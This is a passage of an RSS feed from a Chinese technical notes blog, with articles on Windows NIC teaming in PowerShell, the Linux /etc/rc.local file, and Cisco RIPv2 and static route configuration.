<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">PS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> C:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">indows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ystem3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">2&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">New-NetLbfoTeam</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaa</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -TeamMembers</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "以太网"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">New-NetLbfoTeam</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> The</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LBFO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> feature</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> currently</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enabled,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LBFO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> supported</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SKU.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">所在位置</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 行:1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> New-NetLbfoTeam</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aaa</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -TeamMembers</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "以太网"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    +</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CategoryInfo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NotSpecified:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (MSFT_NetLbfoTeam:root/StandardCimv2/MSFT_NetLbfoTeam) [New-NetLbfoTeam],</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   CimException</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    +</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FullyQualifiedErrorId</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> :</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MI</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RESULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1,New-NetLbfoTeam</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>配置NIC Teaming</h3>
<h4>启动PowerShell</h4>
<p>打开PowerShell：在搜索框中输入“PowerShell”，右键点击“Windows PowerShell”，选择“以管理员身份运行”。</p>
<h4>列出网络适配器</h4>
<p>查看网卡: 输入以下命令查看计算机上的网络适配器：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Get-NetAdapter</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>记下需要加入网卡组的网卡名称，例如，<code>Ethernet</code> 和 <code>Ethernet 2</code>。</p>
<h4>创建网卡组</h4>
<p>创建网卡组：使用以下命令创建网卡组 名为“2Gbps”：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">New-NetSwitchTeam</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Name </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"2Gbps"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">TeamMembers </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Ethernet"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Ethernet 2"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果命令成功执行且没有报错，则表示网卡组创建成功。</p>
<h4>验证网卡组</h4>
<p>验证网卡组：使用以下命令确认网卡组是否创建成功：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Get-NetSwitchTeam</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>如果看到新创建的网卡组信息，则表示配置成功。</p>
<h3>配置网络设置</h3>
<h4>设置静态IP地址</h4>
<p>配置网络桥接：</p>
<ul>
<li>在“网络连接”窗口中，有新的网络适配器。</li>
<li>右键点击网络适配器，选择“属性”。</li>
<li>选择“Internet 协议版本 4 (TCP/IPv4)”并点击“属性”。</li>
<li>选择“使用下面的IP地址”。</li>
<li>输入适当的IP地址、子网掩码和默认网关。</li>
<li>点击“确定”，保存设置。</li>
</ul>
<h4>测试和验证</h4>
<p>测试网络连接：</p>
<ul>
<li>打开cmd，使用 ping  命令测试网络连通性。例如：</li>
</ul>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ping </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8.8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8.8</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  # 测试外网连通性</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>使用带宽测试工具：浏览器访问带宽测试网站 <a href="https://www.speedtest.net" target="_blank" rel="noopener noreferrer">Speedtest</a></p>
<h3>删除NIC Teaming</h3>
<p>删除网卡组：如果需要删除已创建的网卡组，可以使用以下命令：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">Remove-NetSwitchTeam</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">Name </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"2Gbps"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Linux解释etc下面rc.local的含义</title>
      <link>https://www.geekery.cn/note-book/LinuxOperaSystem/Linux%E8%A7%A3%E9%87%8Aetc%E4%B8%8B%E9%9D%A2rc.local%E7%9A%84%E5%90%AB%E4%B9%89.html</link>
      <guid>https://www.geekery.cn/note-book/LinuxOperaSystem/Linux%E8%A7%A3%E9%87%8Aetc%E4%B8%8B%E9%9D%A2rc.local%E7%9A%84%E5%90%AB%E4%B9%89.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Linux解释etc下面rc.local的含义</source>
      <description>Linux解释etc下面rc.local的含义 rc.local是在系统启动过程中不起眼的一个文件，现在对这个文件进行解释。 初探这个文件 这个配置文件会在用户登陆之前读取，这个文件中写入了什么命令，在每次系统启动时都会执行一次。也就是说，如果有任何需要在系统启动时运行的工作，则只需写入 /etc/rc.d/rc.local 配置文件即可。这个文件的内...</description>
      <pubDate>Thu, 25 Jul 2024 14:45:52 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>rc.local是在系统启动过程中不起眼的一个文件，现在对这个文件进行解释。</p>
</blockquote>
<h2>初探这个文件</h2>
<blockquote>
<p>这个配置文件会在用户登陆之前读取，这个文件中写入了什么命令，在每次系统启动时都会执行一次。也就是说，如果有任何需要在系统启动时运行的工作，则只需写入 /etc/rc.d/rc.local 配置文件即可。这个文件的内容如下：</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@hcss-ecs-3689 etc]# cat /etc/rc.local</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># It is highly advisable to create own systemd services or udev rules</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># to run scripts during boot instead of using this file.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># In contrast to previous versions due to parallel execution during boot</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># this script will NOT be run after all other services.</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># that this script will be executed during boot.</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">touch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lock/subsys/local</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>解释语句</h2>
<p>整个文件只有一个语句，作用是<strong>系统的启动时间。</strong></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">touch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lock/subsys/local</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>默认会touch这个文件，每次系统启动时都会touch这个文件，这个文件的修改时间就是<strong>记录系统的启动时间</strong></p>
<p>然后我查看了touch命令的man页，touch不止有创建文件的作用还有创建文件时更改日期的作用。</p>
<p>用法奇特。</p>
<h2>解释</h2>
<p>这句指令的作用只有一个，就是记录开机时间的隐形命令，touch完了立马rm.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Cisco路由器RIPv2配置</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8RIPv2%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8RIPv2%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cisco路由器RIPv2配置</source>
      <description>Cisco路由器RIPv2配置 本文档详细说明了如何在路由器 R1 上配置RIP 协议，然后确保网络流量能够通过指定的接口离开，并正确通告路由信息。 在现代网络中使用的较少！！！ 什么是 RIP 协议？ RIP（Routing Information Protocol，路由信息协议）是一种基于距离矢量的路由协议，最早定义在 RFC 1058 中。它是互...</description>
      <pubDate>Thu, 25 Jul 2024 13:58:41 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>本文档详细说明了如何在路由器 R1 上配置RIP 协议，然后确保网络流量能够通过指定的接口离开，并正确通告路由信息。</p>
<p>在现代网络中使用的较少！！！</p>
</blockquote>
<h2>什么是 RIP 协议？</h2>
<p>RIP（Routing Information Protocol，路由信息协议）是一种基于距离矢量的路由协议，最早定义在 RFC 1058 中。它是互联网中最早被广泛使用的路由协议之一。RIP 使用跳数作为度量值，最多允许 15 跳，16 跳被认为是不可达。RIP 的更新周期为 30 秒，通过周期性广播整个路由表来维护和更新路由信息。</p>
<p>**路由信息协议（RIP）**协议是基于距离矢量路由的域内（内部）路由协议，它在自治系统内部使用。路由器和网络链路称为节点。路由表的第一列是目标地址。该协议中度量的成本是跳数，跳数是到达目的地需要传递的网络数。在这里，无限是由固定数字16定义的，这意味着使用Rip，网络的跳数不能超过15。</p>
<p>使用 RIP 协议的主要原因包括：</p>
<ul>
<li>简单易用，配置方便。</li>
<li>对小型和中型网络环境足够有效。</li>
<li>兼容性好，许多路由器都支持。</li>
</ul>
<h2>配置步骤</h2>
<h3>步骤 1：创建默认路由</h3>
<p>使用适当的命令在 R1 上创建默认路由，以使所有互联网流量通过 S0/0/1 离开网络。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# ip route 0.0.0.0 0.0.0.0 serial 0/0/1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>步骤 2：进入 RIP 协议配置模式</h3>
<p>进入 RIP 协议配置模式，准备进行后续的 RIP 配置。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# router rip</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>步骤 3：配置 RIP 协议的第 2 版并禁用网络汇总</h3>
<p>在 RIP 协议配置模式下，启用 RIP 的第 2 版，并禁用自动汇总功能。RIP 第 2 版支持无类路由和多播传输，改进了第 1 版的许多限制。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config-router</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# version 2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config-router</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# no auto-summary</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>步骤 4：为连接到 R1 的网络配置 RIP</h3>
<p>在 RIP 协议配置模式下，配置 R1 的直连网络，使其能够通过 RIP 协议进行通告。这确保了这些网络能够被 RIP 路由器正确识别和路由。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config-router</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# network 192.168.1.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config-router</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# network 192.168.2.0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>步骤 5：配置不含路由器的 LAN 端口</h3>
<p>配置不含路由器的 LAN 端口，这样端口就不会发出任何路由信息。这样可以减少不必要的 RIP 路由更新，减少网络负载。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config-router</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# passive-interface gigabitEthernet 0/0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>步骤 6：通告默认路由</h3>
<p>通过其他 RIP 路由器，通告步骤 1 中配置的默认路由。这使得网络中的其他 RIP 路由器知道如何访问外部网络。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config-router</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# default-information originate</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>步骤 7：保存配置</h3>
<p>保存当前的运行配置到启动配置，以确保配置在重启后依然有效。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> wr</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 或者</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> copy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> running-config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> startup-config</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Cisco路由器配置静态路由</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cisco路由器配置静态路由</source>
      <description>Cisco路由器配置静态路由 本文档介绍了如何在Cisco路由器（R1和R2）上配置静态路由，以确保它们能够正确地相互通信。我们将详细讲解如何在两台路由器上设置静态路由，包括具体的配置步骤和验证命令。 拓扑图 在此拓扑中，我们有两个路由器（R1和R2），它们通过Serial0/0/0接口连接，并且它们之间的通信需要通过静态路由来实现。 image-20...</description>
      <pubDate>Thu, 25 Jul 2024 10:54:23 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>本文档介绍了如何在Cisco路由器（R1和R2）上配置静态路由，以确保它们能够正确地相互通信。我们将详细讲解如何在两台路由器上设置静态路由，包括具体的配置步骤和验证命令。</p>
</blockquote>
<h2>拓扑图</h2>
<p>在此拓扑中，我们有两个路由器（R1和R2），它们通过Serial0/0/0接口连接，并且它们之间的通信需要通过静态路由来实现。</p>
<p></p>
<h2>R1路由器配置</h2>
<h3>R1进入特权模式</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">enable</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>R1进入全局配置模式</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置静态路由</h3>
<p>添加静态路由，将目的网络和子网掩码与下一跳地址关联。以下命令配置了到达 <code>10.1.1.0/30</code> 和 <code>10.1.2.0/30</code> 网络的静态路由，下一跳地址为 <code>209.165.200.224</code>：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# ip route 10.1.1.0 255.255.255.252 209.165.200.224</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# ip route 10.1.2.0 255.255.255.252 209.165.200.224</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>R1查看路由表</h3>
<p>使用 <code>show ip route</code> 命令查看路由表，确保静态路由已经添加：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">R1(config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)# </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> show</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> route</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>示例输出：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Codes:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> L</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> connected,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> static,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> R</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> RIP,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mobile,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> B</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> BGP</span></span>
